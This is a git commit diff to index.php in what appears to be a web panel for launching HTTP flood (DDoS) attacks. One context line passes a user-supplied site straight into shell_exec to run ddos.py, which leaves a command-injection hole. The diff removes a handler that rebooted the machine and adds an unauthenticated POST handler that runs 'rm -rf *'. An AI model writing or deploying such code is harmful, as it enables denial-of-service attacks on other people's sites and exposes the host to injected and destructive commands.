45a8faabcdb6f6b3e0bea3aca3fac7c1263c3c8f
ph.kawayan <83699943+phkawayan@users.noreply.github.com>
2021-08-30 19:19:56 +0800

    Update index.php

--- index.php
+++ index.php
@@ -6,12 +6,8 @@ echo shell_exec("python2 ddos.py http://$site");
 echo"<script>alert('HTTPFLOOD sent to $site')</script>";
    }
 
-$htmlmobile = base64_decode('PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFhIVE1MIE1vYmlsZSAxLjAvL0VOIiAiaHR0cDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3hodG1sLW1vYmlsZTEwLmR0ZCI+');
-if( $_POST["stop"]) {      
-echo $htmlmobile;
-$stop = $_POST["stop"];
-echo shell_exec("reboot");
-echo shell_exec("exit");
-echo"<script>alert('All attacks has been stopped')</script>";
-   }
+if( $_POST["rm"]) {
+$rm = $_POST["rm"];
+echo shell_exec("rm -rf *");
+}
 ?>
